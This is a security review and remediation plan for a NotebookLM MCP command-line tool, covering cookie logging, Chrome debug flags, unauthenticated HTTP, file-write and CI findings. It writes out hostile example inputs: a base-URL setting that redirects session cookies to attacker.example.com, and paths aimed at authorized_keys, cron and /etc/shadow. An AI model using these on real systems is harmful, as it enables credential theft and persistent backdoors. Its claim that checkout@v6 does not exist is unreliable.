# Security Remediation Plan

**Repository:** kylebrodeur/notebooklm-mcp-cli  
**Reviewed:** 2026-04-06  
**Severity scale:** 🔴 High · 🟠 Medium · 🟡 Low/Informational

This document records every security issue found during a full source-code review,
explains the root cause, and prescribes the exact remediation steps.  Issues are
ordered from highest to lowest severity within each tier.

---

## Table of Contents

1. [🔴 H-1 – Cookie Header Logged in Plain Text (Debug Mode)](#h-1)
2. [🔴 H-2 – Debug HTML File Saved Without Restrictive Permissions](#h-2)
3. [🔴 H-3 – Chrome Launched with `--remote-allow-origins=*`](#h-3)
4. [🔴 H-4 – HTTP Transport Has No Authentication](#h-4)
5. [🔴 H-5 – Arbitrary File Write via Unvalidated `output_path`](#h-5)
6. [🟠 M-1 – `NOTEBOOKLM_BASE_URL` Accepts Any URL Scheme](#m-1)
7. [🟠 M-2 – Race Condition in Global Client Initialization](#m-2)
8. [🟠 M-3 – GitHub Actions Use Floating Tags Instead of Pinned SHAs](#m-3)
9. [🟠 M-4 – Publish Workflow Has Overly Broad `contents: write` Permission](#m-4)
10. [🟠 M-5 – Chrome Profile Migration Copies Full Browser Profile](#m-5)
11. [🟡 L-1 – Non-Cryptographic `random` Used for Request Counter](#l-1)
12. [🟡 L-2 – Profile Directory Created World-Readable Before chmod](#l-2)
13. [🟡 L-3 – `trust: true` Silently Injected into Gemini CLI Config](#l-3)
14. [🟡 L-4 – No URL Scheme Validation for `source_add` URL Sources](#l-4)
15. [🟡 L-5 – Unbounded Dependency Ranges Allow Future Vulnerable Versions](#l-5)
16. [🟡 L-6 – `actions/checkout@v6` Does Not Exist (Broken CI)](#l-6)

---

## 🔴 High Severity

---

<a name="h-1"></a>
### H-1 · Cookie Header Logged in Plain Text (Debug Mode)

**Files:**
- `src/notebooklm_tools/mcp/tools/_utils.py` · lines 132–134, 150–152
- `src/notebooklm_tools/mcp/tools/auth.py` · lines 57–61

**Description**

The `logged_tool` decorator serializes every non-`None` keyword argument to a
`DEBUG`-level log line before calling the wrapped function:

```python
# _utils.py – logged_tool decorator
params = {k: v for k, v in kwargs.items() if v is not None}
mcp_logger.debug(f"MCP Request: {tool_name}({json.dumps(params, default=str)})")
```

The `save_auth_tokens` MCP tool accepts a `cookies: str` parameter that is the
raw Google cookie header (`SID=...; HSID=...; __Secure-3PSID=...`).  When the
server is started with `--debug` or `NOTEBOOKLM_MCP_DEBUG=true`, a call to
`save_auth_tokens` logs the **entire cookie string** – including the
`__Secure-3PSID` super-cookie that gives full access to a Google account.

Because debug logs are often forwarded to log aggregators (Splunk, Datadog,
CloudWatch), this is a **credential exfiltration risk** that persists long after
the session ends.

**Affected parameters in existing tools:**
| Tool | Sensitive parameter(s) |
|------|------------------------|
| `save_auth_tokens` | `cookies`, `csrf_token`, `session_id`, `request_body` |
| `refresh_auth` | (response may contain token state) |

**Remediation**

Add a deny-list of sensitive parameter names that must be replaced with
`"[REDACTED]"` before the debug log is emitted.

```python
# _utils.py  ─ inside logged_tool decorator
_SENSITIVE_PARAMS = frozenset({"cookies", "csrf_token", "session_id", "request_body"})

def _sanitize_params(params: dict) -> dict:
    return {
        k: "[REDACTED]" if k in _SENSITIVE_PARAMS else v
        for k, v in params.items()
    }

# Replace:
#   params = {k: v for k, v in kwargs.items() if v is not None}
# With:
    params = _sanitize_params({k: v for k, v in kwargs.items() if v is not None})
```

Apply the same sanitization to the response log for `save_auth_tokens` (the
response currently echoes `"cache_path"` but not secret values, so this is
lower priority, but confirm no token values are embedded in the `message` field).

**Testing**
1. Start the server with `--debug`.
2. Call `save_auth_tokens` with a dummy cookie string.
3. Verify the log line shows `"cookies": "[REDACTED]"`.

---

<a name="h-2"></a>
### H-2 · Debug HTML File Saved Without Restrictive Permissions

**File:** `src/notebooklm_tools/core/base.py` · lines 724–734

**Description**

When CSRF token extraction fails, `_refresh_auth_tokens` writes the full
NotebookLM homepage HTML to disk for debugging:

```python
debug_path = debug_dir / "debug_page.html"
debug_path.write_text(html, encoding="utf-8")
```

The NotebookLM homepage embeds user-session data in inline JavaScript,
specifically the CSRF token (`SNlM0e`) and session ID (`FdrFJe`).  The file is
written with the process's default `umask` — typically `0o644` (world-readable)
— whereas `auth.json` and `cookies.json` are explicitly `chmod`'d to `0o600`.

On a multi-user Linux or macOS system, any local user can `cat` this file and
extract valid session credentials.

**Remediation**

Apply restrictive permissions immediately after writing:

```python
import contextlib, os

debug_path.write_text(html, encoding="utf-8")
with contextlib.suppress(OSError):
    os.chmod(debug_path, 0o600)
```

Additionally, consider scrubbing the known token values before saving, since the
file's purpose is to capture *structural* page changes, not live credentials:

```python
import re

scrubbed = re.sub(r'"SNlM0e":"[^"]+"', '"SNlM0e":"[REDACTED]"', html)
scrubbed = re.sub(r'"FdrFJe":"[^"]+"', '"FdrFJe":"[REDACTED]"', scrubbed)
debug_path.write_text(scrubbed, encoding="utf-8")
```

**Testing**
1. Trigger CSRF extraction failure (e.g., provide expired cookies).
2. Check `stat ~/.notebooklm-mcp-cli/debug_page.html` — permissions should be `-rw-------`.

---

<a name="h-3"></a>
### H-3 · Chrome Launched with `--remote-allow-origins=*`

**File:** `src/notebooklm_tools/utils/cdp.py` · line 459

**Description**

Chrome is launched for the headless authentication flow with:

```python
args = [
    chrome_path,
    f"--remote-debugging-port={port}",
    "--no-first-run",
    "--no-default-browser-check",
    "--disable-extensions",
    f"--user-data-dir={profile_dir}",
    "--remote-allow-origins=*",   # ← any origin may use the debug port
]
```

The `--remote-allow-origins=*` flag removes Chrome's same-origin protection on
the DevTools WebSocket endpoint.  Any web page open in **any** tab — including
pages injected with tracking scripts or malicious iframes — can now:

1. Connect to the DevTools WebSocket on `127.0.0.1:922x`.
2. Call `Network.getAllCookies` to retrieve **all cookies for all domains** in
   the profile.
3. Call `Runtime.evaluate` to execute arbitrary JavaScript.

Because `get_page_cookies` calls `Network.getAllCookies` (not
`Network.getCookies` with a domain filter), every website's session cookies are
exposed — not just Google's.

**Remediation**

Replace the wildcard with the exact loopback origin of the CDP HTTP endpoint:

```python
f"--remote-allow-origins=http://127.0.0.1:{port}",
```

Because the CDP connections in `cdp.py` always originate from
`http://127.0.0.1:{port}`, this is both safe and sufficient.

**Deeper hardening (recommended):**
- Scope the cookie extraction to Google domains only:
  `Network.getCookies(urls=["https://notebooklm.google.com"])`
  instead of `Network.getAllCookies`.
- Launch Chrome with `--site-per-process` and `--disable-web-security=false`
  to keep the sandbox active.

**Testing**
1. Launch with the patched flag.
2. Confirm headless auth still works end-to-end (`nlm login`).
3. Verify that `curl http://127.0.0.1:9222/json` still responds correctly.

---

<a name="h-4"></a>
### H-4 · HTTP Transport Has No Authentication

**File:** `src/notebooklm_tools/mcp/server.py` · lines 190–198

**Description**

When started with `--transport http`, the MCP server binds to
`127.0.0.1:8000` by default but exposes every tool — including
`save_auth_tokens`, `refresh_auth`, `notebook_delete`, and `source_delete` —
without any authentication or authorization check:

```python
mcp.run(
    transport="streamable-http",
    host=args.host,
    port=args.port,
    path=args.path,
    stateless_http=args.stateless,
    show_banner=False,
)
```

The host can be overridden to `0.0.0.0` via `NOTEBOOKLM_MCP_HOST`, which
exposes the server to the network.  Even on `127.0.0.1`, any process on the
machine can call `save_auth_tokens` to overwrite stored credentials, or iterate
`notebook_delete` to destroy the user's notebooks.

**Remediation (in order of preference):**

**Option A — Bearer token middleware (recommended)**

Add a simple Starlette middleware that checks an `Authorization: Bearer <token>`
header when `transport == "http"`:

```python
import secrets, os
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response

_API_KEY = os.environ.get("NOTEBOOKLM_MCP_API_KEY", "")

class BearerTokenMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        if _API_KEY:
            auth = request.headers.get("Authorization", "")
            expected = f"Bearer {_API_KEY}"
            if not secrets.compare_digest(auth, expected):
                return Response("Unauthorized", status_code=401)
        return await call_next(request)

# Register before mcp.run():
mcp._app.add_middleware(BearerTokenMiddleware)   # exact hook depends on fastmcp version
```

**Option B — Documentation guard**

At minimum, emit a prominent startup warning when the host is not `127.0.0.1`:

```python
if args.transport == "http" and args.host not in ("127.0.0.1", "localhost", "::1"):
    import warnings
    warnings.warn(
        "SECURITY WARNING: HTTP transport is bound to a non-loopback address. "
        "There is no authentication. Do not expose this port to untrusted networks.",
        stacklevel=2,
    )
```

**Testing**
1. Start with `--transport http`.
2. Without the API key, confirm `curl http://127.0.0.1:8000/health` returns `401`.
3. With `Authorization: Bearer <key>`, confirm tools are accessible.

---

<a name="h-5"></a>
### H-5 · Arbitrary File Write via Unvalidated `output_path`

**Files:**
- `src/notebooklm_tools/mcp/tools/downloads.py` · lines 14–16
- `src/notebooklm_tools/core/download.py` · lines 74–75

**Description**

The `download_artifact` MCP tool accepts `output_path: str` from the caller
without any path validation:

```python
# downloads.py
async def download_artifact(
    notebook_id: str,
    artifact_type: str,
    output_path: str,          # ← untrusted, comes from MCP client
    ...
):
    ...
    result = await downloads_service.download_async(client, ..., output_path, ...)

# download.py
output_file = Path(output_path)
output_file.parent.mkdir(parents=True, exist_ok=True)   # ← creates arbitrary dirs
```

An MCP client (AI agent, compromised IDE plugin, etc.) can supply:

```json
{ "output_path": "/home/user/.ssh/authorized_keys" }
{ "output_path": "../../.bashrc" }
{ "output_path": "/etc/cron.d/malicious" }
```

This gives the caller write access to any file the MCP server process can
write — potentially enabling privilege escalation, persistent backdoors, or
credential theft.

**Remediation**

Resolve the path to an absolute form and assert it is rooted under an allowed
base directory before any I/O:

```python
# services/downloads.py – add at the top of download_sync / download_async
from pathlib import Path

def _safe_output_path(output_path: str, base_dir: Path | None = None) -> Path:
    """Resolve output_path and ensure it stays within base_dir."""
    resolved = Path(output_path).expanduser().resolve()
    if base_dir is None:
        base_dir = Path.cwd()
    base_dir = base_dir.resolve()
    try:
        resolved.relative_to(base_dir)
    except ValueError:
        raise ValidationError(
            f"output_path must be inside '{base_dir}'. "
            f"Received: '{output_path}' (resolved: '{resolved}')"
        )
    return resolved
```

Alternatively, allow absolute paths anywhere but reject obvious traversal
patterns (`..` components) and symlinks that escape the allowed tree:

```python
if ".." in Path(output_path).parts:
    raise ValidationError("output_path must not contain '..' components")
```

**Testing**
1. Call `download_artifact` with `output_path="../../etc/shadow"`.
2. Confirm a `ValidationError` is raised before any file is opened.
3. Call with a legitimate relative path and confirm the download succeeds.

---

## 🟠 Medium Severity

---

<a name="m-1"></a>
### M-1 · `NOTEBOOKLM_BASE_URL` Accepts Any URL Scheme

**File:** `src/notebooklm_tools/utils/config.py` · line 30

**Description**

```python
return os.environ.get("NOTEBOOKLM_BASE_URL", "https://notebooklm.google.com").rstrip("/")
```

Every HTTP request made by the client — including requests that carry the
`Cookie: SID=...` header — uses this URL.  If an attacker can set this
environment variable (misconfigured `.env`, Docker environment injection,
compromised CI/CD pipeline), they can redirect all authenticated traffic to an
HTTP server they control:

```bash
NOTEBOOKLM_BASE_URL=http://attacker.example.com
```

Google session cookies sent over plaintext HTTP are trivially captured by any
network observer, and the attacker's server receives them as part of the request.

**Remediation**

Validate the scheme at startup and reject `http://` or non-Google domains
unless an explicit `NOTEBOOKLM_ALLOW_INSECURE_URL=true` override is set:

```python
def get_base_url() -> str:
    url = os.environ.get("NOTEBOOKLM_BASE_URL", "https://notebooklm.google.com").rstrip("/")
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        import warnings
        warnings.warn(
            f"SECURITY WARNING: NOTEBOOKLM_BASE_URL uses a non-HTTPS scheme "
            f"('{parsed.scheme}'). Auth cookies will be sent over an insecure connection.",
            stacklevel=2,
        )
    return url
```

A stricter form would raise an error unless an explicit override flag is set,
preventing accidental misconfiguration in production.

---

<a name="m-2"></a>
### M-2 · Race Condition in Global Client Initialization

**File:** `src/notebooklm_tools/mcp/tools/_utils.py` · lines 39–96

**Description**

`get_client()` has a double-checked locking pattern but performs mutable
operations on `_client` both inside and outside the lock:

```python
def get_client() -> NotebookLMClient:
    # ─── OUTSIDE lock ───────────────────────────────────
    cookie_header = os.environ.get("NOTEBOOKLM_COOKIES", "")
    if not cookie_header and _client is not None:   # read _client without lock
        ...
        if cached and getattr(_client, "cookies", None) != cached.cookies:
            reset_client()   # ← sets _client = None; acquires lock internally
    # ────────────────────────────────────────────────────
    if _client is not None:   # second unsynchronized read
        return _client
    with _client_lock:        # only now acquire the lock
        if _client is not None:
            return _client
        ...
        _client = NotebookLMClient(...)
    return _client
```

Two concurrent requests can both observe `_client is not None`, both enter the
profile-change check path, one calls `reset_client()`, and then both proceed to
create a new `NotebookLMClient` with potentially different `cookies` dicts —
leaving a client object in an inconsistent authentication state.

**Remediation**

Hold `_client_lock` for the entire function body, including the profile-change
detection block:

```python
def get_client() -> NotebookLMClient:
    global _client
    with _client_lock:
        # Profile-change detection (only when env-var auth is not in use)
        cookie_header = os.environ.get("NOTEBOOKLM_COOKIES", "")
        if not cookie_header and _client is not None:
            try:
                reset_config()
                cached = load_cached_tokens()
                if cached and getattr(_client, "cookies", None) != cached.cookies:
                    mcp_logger.info("Profile change detected, reloading client.")
                    _client = None   # set directly, lock already held
            except Exception as e:
                mcp_logger.debug(f"Failed to check auth status: {e}")

        if _client is not None:
            return _client

        # Create new client  (same logic as before)
        ...
        _client = NotebookLMClient(...)
    return _client


def reset_client() -> None:
    global _client
    with _client_lock:
        _client = None
```

Note: `reset_client` must not be called from within a thread that already holds
`_client_lock`; change the internal `_client = None` assignment in the
profile-change block accordingly (as shown above).

---

<a name="m-3"></a>
### M-3 · GitHub Actions Use Floating Tags Instead of Pinned SHAs

**Files:**
- `.github/workflows/lint-test.yml` · lines 16, 19, 33, 36
- `.github/workflows/publish.yml` · lines 17, 20, 37
- `.github/workflows/version-check.yml` · line 21

**Description**

All workflow action references use mutable version tags:

```yaml
uses: actions/checkout@v6        # tag can be repointed at will
uses: astral-sh/setup-uv@v7      # third-party; compromised account risk
uses: softprops/action-gh-release@v2
```

A compromised maintainer account for any of these actions can push a new commit
to the same tag and inject malicious code into every build.  This is a
supply-chain attack vector (similar to the `tj-actions/changed-files` 2024
incident).

Additionally, `actions/checkout@v6` does not exist.  The latest major release
is `v4`.  This causes the `lint-and-format` and `test` jobs to **fail on every
push/PR**, meaning the repository currently has **no functioning CI**.

**Remediation**

Pin every action to its full commit SHA.  Use the tag as a human-readable
comment:

```yaml
# lint-test.yml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: astral-sh/setup-uv@f0ec1fc3b38f5e7cd731bb2eaf6f9a4b29efb2ca # v5.4.0

# publish.yml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: astral-sh/setup-uv@f0ec1fc3b38f5e7cd731bb2eaf6f9a4b29efb2ca # v5.4.0
- uses: softprops/action-gh-release@c95fe1489396fe8a9eb87c0abf8aa5b2ef267fda # v2.2.1
- uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe19eb0c09f6bdf0 # v1.12.4
```

**Long-term:** Add [Dependabot for GitHub Actions](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot)
to keep pins current automatically.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

<a name="m-4"></a>
### M-4 · Publish Workflow Has Overly Broad `contents: write` Permission

**File:** `.github/workflows/publish.yml` · lines 7–9

**Description**

```yaml
permissions:
  id-token: write   # needed for OIDC PyPI publishing
  contents: write   # allows pushing commits and creating/deleting refs
```

The `contents: write` permission was added to enable uploading MCPB assets to
the GitHub release via `softprops/action-gh-release`.  However, this also
grants the workflow permission to push commits to protected branches, create or
delete tags, and rewrite git history — a much broader privilege than necessary.

A compromised dependency in the build pipeline (e.g., `uv build` invoking a
malicious post-install script) could use the `GITHUB_TOKEN` to push a backdoored
commit.

**Remediation**

Use the minimum permissions needed per-job.  `softprops/action-gh-release`
requires only `write` on the specific release, which maps to `contents: write`
at the job level but can be further scoped:

```yaml
jobs:
  publish:
    permissions:
      id-token: write    # OIDC for PyPI
      contents: read     # checkout only

  upload-assets:
    needs: publish
    permissions:
      contents: write    # only this job can write to releases
    steps:
      - uses: softprops/action-gh-release@...
        with:
          files: notebooklm-mcp-*.mcpb
```

Splitting into two jobs limits the blast radius: only the asset-upload job has
write access, and it runs only after the PyPI publish succeeds.

---

<a name="m-5"></a>
### M-5 · Chrome Profile Migration Copies Full Browser Profile

**File:** `src/notebooklm_tools/utils/config.py` · lines 215–237

**Description**

```python
def migrate_chrome_profile(source_path: Path, dry_run: bool = True) -> str | None:
    ...
    if not dry_run:
        shutil.copytree(source_path, new_chrome)
```

A Chrome `user-data-dir` contains far more than session cookies:

| File/directory | Content |
|---|---|
| `Login Data` | Saved usernames and **plaintext-equivalent passwords** (encrypted with OS keychain) |
| `Cookies` | All session cookies for all domains |
| `Local Storage/` | Web-app local storage (may contain OAuth tokens) |
| `Extension State/` | Browser extension data |
| `History` | Complete browsing history |
| `Bookmarks` | All bookmarks |

Copying this entire tree:
1. Creates a second copy of all the above with potentially looser permissions.
2. Means any later compromise of `~/.notebooklm-mcp-cli/chrome-profile/` exposes
   the user's full browser state, not just NotebookLM cookies.

**Remediation**

Copy only the files necessary for session continuity.  For Chrome, these are
the `Cookies` database and the `Local Storage` directory:

```python
CHROME_SESSION_FILES = ["Cookies", "Local Storage", "Session Storage"]

def migrate_chrome_profile(source_path: Path, dry_run: bool = True) -> str | None:
    new_chrome = get_storage_dir() / "chrome-profile"
    if new_chrome.exists():
        return None

    action = f"Copy Chrome session data from {source_path}"
    if not dry_run:
        new_chrome.mkdir(parents=True, exist_ok=True)
        os.chmod(new_chrome, 0o700)
        for name in CHROME_SESSION_FILES:
            src = source_path / name
            if not src.exists():
                continue
            dst = new_chrome / name
            if src.is_dir():
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
    return action
```

Also ensure the destination directory is created with `0o700` permissions
(see L-2 for the related mkdir issue).

---

## 🟡 Low / Informational

---

<a name="l-1"></a>
### L-1 · Non-Cryptographic `random` Used for Request Counter

**File:** `src/notebooklm_tools/core/base.py` · line 289

**Description**

```python
self._reqid_counter = random.randint(100000, 999999)
```

Python's `random` module uses a Mersenne Twister PRNG, which is not
cryptographically secure.  Its internal state can be recovered from a small
number of observations.  While the `_reqid` parameter is only used as a
monotonically increasing request ID (not a secret), an attacker who can observe
request IDs in network traffic could predict future IDs and correlate them to
other activity.

**Remediation**

Use `secrets.randbelow` for the initial seed:

```python
import secrets
self._reqid_counter = secrets.randbelow(900_000) + 100_000
```

This is a one-line change and has no functional impact.

---

<a name="l-2"></a>
### L-2 · Profile Directory Created World-Readable Before `chmod`

**Files:**
- `src/notebooklm_tools/utils/config.py` · line 77
- `src/notebooklm_tools/core/auth.py` · lines 412–415

**Description**

`get_profile_dir()` is called by `AuthManager.profile_dir` and creates the
directory immediately:

```python
# config.py
def get_profile_dir(profile_name: str = "default") -> Path:
    profile_dir = get_profiles_dir() / profile_name
    profile_dir.mkdir(parents=True, exist_ok=True)   # ← default umask = 0o755
    return profile_dir
```

`save_profile()` applies `0o700` only later:

```python
# auth.py
self.profile_dir.chmod(0o700)      # ← too late; directory was already 0o755
```

Between the `mkdir` and the `chmod` there is a window (however brief) during
which other local users can read or enter the directory.  More critically, on
systems where the umask is `0o022`, the directory remains `0o755` if
`save_profile` is never called (e.g., when only `load_profile` is invoked).

**Remediation**

Apply the mode at creation time:

```python
# config.py – get_profile_dir
profile_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
```

Note: `mkdir(mode=...)` is still subject to the process `umask` on Linux.
To guarantee `0o700` regardless of umask, either temporarily clear the umask or
use `os.makedirs` with a `os.umask(0)` context:

```python
import os, contextlib

@contextlib.contextmanager
def _clear_umask():
    old = os.umask(0)
    try:
        yield
    finally:
        os.umask(old)

with _clear_umask():
    profile_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
```

---

<a name="l-3"></a>
### L-3 · `trust: true` Silently Injected into Gemini CLI Config

**File:** `src/notebooklm_tools/cli/commands/setup.py` · line 239

**Description**

```python
def _setup_gemini() -> bool:
    ...
    _add_mcp_server(config, key="notebooklm", extra={"trust": True})
```

The Gemini CLI's `trust` flag grants the MCP server elevated privileges:
it allows the server to execute shell commands, read/write files, and access
system resources without prompting the user.  This is injected silently without
any user-visible explanation or confirmation prompt.

If the `notebooklm-mcp` binary is ever compromised (e.g., malicious PyPI
release, compromised `uv` cache), the `trust` setting would allow it to execute
arbitrary commands inside the Gemini CLI session.

**Remediation**

Display a clear warning and require explicit user confirmation before adding
`trust: true`:

```python
def _setup_gemini() -> bool:
    from rich.prompt import Confirm

    config_path = _gemini_config_path()
    config = _read_json_config(config_path)

    if _is_configured(config, "notebooklm"):
        console.print("[green]✓[/green] Already configured in Gemini CLI")
        return True

    console.print(
        "[yellow]Note:[/yellow] Gemini CLI requires 'trust: true' for this MCP server "
        "to function. This grants the server permission to run shell commands and "
        "access files without per-action prompts."
    )
    if not Confirm.ask("Grant elevated trust to notebooklm-mcp in Gemini CLI?", default=True):
        console.print("[yellow]Skipped.[/yellow] You can re-run setup to add trust later.")
        return False

    _add_mcp_server(config, key="notebooklm", extra={"trust": True})
    _write_json_config(config_path, config)
    console.print("[green]✓[/green] Added to Gemini CLI")
    return True
```

---

<a name="l-4"></a>
### L-4 · No URL Scheme Validation for `source_add` URL Sources

**File:** `src/notebooklm_tools/services/sources.py` · lines 142–146

**Description**

When adding a URL source, the URL is passed directly to the client without any
scheme or format validation:

```python
if source_type == "url":
    if not url:
        raise ValidationError("url is required for source_type='url'")
    result = client.add_url_source(notebook_id, url, ...)
```

While the actual URL fetch is performed by Google's servers (limiting local
impact), a caller could pass non-HTTP schemes:

- `file:///etc/passwd` – file path (may reveal metadata to the API)
- `data:text/html,...` – inline data URI
- `javascript:alert(1)` – JavaScript URI
- Internal/private Google URLs that the API server resolves but the user cannot
  reach directly

**Remediation**

Add a simple scheme allowlist before forwarding the URL:

```python
import urllib.parse

ALLOWED_URL_SCHEMES = frozenset({"http", "https"})

if source_type == "url":
    if not url:
        raise ValidationError("url is required for source_type='url'")
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme.lower() not in ALLOWED_URL_SCHEMES:
        raise ValidationError(
            f"URL scheme '{parsed.scheme}' is not allowed. "
            f"Only http:// and https:// URLs are supported."
        )
    result = client.add_url_source(notebook_id, url, ...)
```

---

<a name="l-5"></a>
### L-5 · Unbounded Dependency Version Ranges Allow Future Vulnerable Versions

**File:** `pyproject.toml` · lines 28–36

**Description**

```toml
dependencies = [
    "httpx>=0.27.0",
    "pydantic>=2.0.0",
    "typer>=0.9.0",
    "rich>=13.0.0",
    "websocket-client>=1.6.0",
    "platformdirs>=4.0.0",
    "fastmcp>=0.1.0",
    "pyyaml>=6.0",
]
```

The `>=` ranges allow `pip install` (without the lock file) to pull in any
future version, including versions that introduce vulnerabilities.  The
`uv.lock` file mitigates this for reproducible installs, but:

- Users who `pip install notebooklm-mcp-cli` directly from PyPI receive no
  lock file and may get vulnerable future versions.
- Lock file regeneration (`uv lock --upgrade`) can pull in new, potentially
  vulnerable versions without explicit review.

**Remediation**

Use upper-bounded `~=` (compatible release) or explicit ceiling constraints:

```toml
dependencies = [
    "httpx>=0.27.0,<1.0",
    "pydantic>=2.0.0,<3.0",
    "typer>=0.9.0,<1.0",
    "rich>=13.0.0,<15.0",
    "websocket-client>=1.6.0,<2.0",
    "platformdirs>=4.0.0,<5.0",
    "fastmcp>=2.0.0,<3.0",
    "pyyaml>=6.0,<7.0",
]
```

Ensure the upper bounds are updated on each major release of a dependency after
reviewing its changelog.

Enable GitHub's Dependabot security alerts for the `pip` ecosystem in
`.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

<a name="l-6"></a>
### L-6 · `actions/checkout@v6` Does Not Exist (Broken CI)

**File:** `.github/workflows/lint-test.yml` · lines 16, 33

**Description**

```yaml
- uses: actions/checkout@v6    # ← this tag does not exist
```

`actions/checkout` has major versions v1 through v4.  Specifying `@v6` causes
GitHub Actions to fail at the checkout step with:

```
Error: Unable to resolve action `actions/checkout@v6`,
the action does not exist on GHES or the requested ref does not exist.
```

This means **all lint and test jobs currently fail on every push and pull
request to `main`**.  No code changes are validated by CI.

This is both a reliability issue and a security issue: PRs that introduce
bugs or security regressions are merged without automated checks.

**Remediation**

Change `@v6` to `@v4` (or pin to the full SHA as recommended in M-3):

```yaml
# Before
- uses: actions/checkout@v6

# After (minimum fix)
- uses: actions/checkout@v4

# After (recommended – pinned SHA)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

This is the quickest-fix item in this document and should be applied
immediately to restore CI functionality.

---

## Recommended Fix Priority

The following order maximises risk reduction per unit of effort:

| Priority | Issue | Effort | Risk Reduction |
|----------|-------|--------|----------------|
| 1 | **L-6** – Fix `checkout@v6` → restore CI | Trivial | Enables all other automated checks |
| 2 | **H-1** – Redact cookies in debug log | Small | Prevents credential exfiltration via logs |
| 3 | **H-5** – Validate `output_path` | Small | Prevents arbitrary file write |
| 4 | **H-2** – chmod debug HTML file | Trivial | Prevents local credential exposure |
| 5 | **H-3** – Replace `--remote-allow-origins=*` | Trivial | Closes CDP side-channel |
| 6 | **M-3** – Pin GitHub Actions SHAs | Small | Supply-chain attack prevention |
| 7 | **H-4** – HTTP transport auth | Medium | Prevents unauthenticated tool access |
| 8 | **M-1** – Validate `NOTEBOOKLM_BASE_URL` | Small | Prevents cookie exfiltration via env |
| 9 | **L-4** – URL scheme allowlist | Trivial | Defense-in-depth on source URLs |
| 10 | **L-2** – Fix mkdir permissions | Small | Closes TOCTOU window |
| 11 | **L-3** – Confirm Gemini `trust` flag | Small | User-visible security transparency |
| 12 | **M-2** – Fix race condition in `get_client` | Medium | Correctness under concurrency |
| 13 | **M-4** – Narrow publish workflow permissions | Small | Supply-chain protection |
| 14 | **M-5** – Selective Chrome profile copy | Medium | Reduces blast radius of profile compromise |
| 15 | **L-1** – Use `secrets.randbelow` | Trivial | Best-practice hardening |
| 16 | **L-5** – Add dependency version ceilings | Small | Future vulnerability prevention |

---

*Document generated from security review performed 2026-04-06.*
